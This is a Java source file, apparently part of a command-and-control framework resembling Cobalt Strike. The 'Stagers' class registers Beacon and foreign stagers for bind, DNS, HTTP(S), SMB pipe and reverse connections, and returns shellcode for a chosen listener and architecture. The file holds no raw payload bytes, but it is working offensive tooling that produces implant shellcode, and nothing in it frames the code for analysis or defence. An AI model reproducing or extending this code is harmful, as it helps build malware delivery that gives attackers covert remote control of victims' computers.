package stagers;

import common.AssertUtils;
import common.CommonUtils;
import common.Listener;

import java.util.HashMap;
import java.util.Map;

public class Stagers {
    private static Stagers stagers = new Stagers();
    protected Map x86_stagers = new HashMap();
    protected Map x64_stagers = new HashMap();

    public Stagers() {
        this.add(new BeaconBindStagerX64(null));
        this.add(new BeaconBindStagerX86(null));
        this.add(new BeaconDNSStagerX86(null));
        this.add(new BeaconHTTPSStagerX64(null));
        this.add(new BeaconHTTPSStagerX86(null));
        this.add(new BeaconHTTPStagerX64(null));
        this.add(new BeaconHTTPStagerX86(null));
        this.add(new BeaconPipeStagerX86(null));
        this.add(new ForeignDNSStagerX86(null));
        this.add(new ForeignHTTPSStagerX86(null));
        this.add(new ForeignHTTPStagerX86(null));
        this.add(new ForeignReverseStagerX64(null));
        this.add(new ForeignReverseStagerX86(null));
    }

    public static byte[] shellcode(String lname, String arch, boolean remote) {
        GenericStager stager = stagers.resolve(lname, arch, remote);
        if (stager != null) {
            return stager.generate();
        }
        return new byte[0];
    }

    public GenericStager resolve(String lname, String arch, boolean remote) {
        Listener listener = Listener.getListener(lname);
        String payload = listener.getPayload();
        Map stagers;
        if ("windows/beacon_dns/reverse_http".equals(payload)) {
            payload = lname.endsWith(" (DNS)") ? "windows/beacon_dns/reverse_dns_txt" : "windows/beacon_http/reverse_http";
        }
        if ("windows/beacon_smb/bind_pipe".equals(payload) && !remote) {
            payload = "windows/beacon_smb/bind_tcp";
        }
        if (!listener.isForeign() && !listener.hasPublicStage() && listener.isEgress()) {
            CommonUtils.print_error(arch + " shellcode for " + lname + " is empty. c2Profile disables network stagers!");
            return null;
        }
        stagers = "x86".equals(arch) ? this.x86_stagers : ("x64".equals(arch) ? this.x64_stagers : null);
        if (stagers.containsKey(payload)) {
            return ((GenericStager) stagers.get(payload)).create(listener);
        }
        CommonUtils.print_error("shellcode for " + lname + " is empty. No stager " + arch + " stager for " + payload);
        return null;
    }

    public void add(GenericStager stager) {
        if (!AssertUtils.TestArch(stager.arch())) {
            CommonUtils.print_info(stager.getClass().toString());
        }
        if ("x86".equals(stager.arch())) {
            this.x86_stagers.put(stager.payload(), stager);
        } else if ("x64".equals(stager.arch())) {
            this.x64_stagers.put(stager.payload(), stager);
        }
    }
}

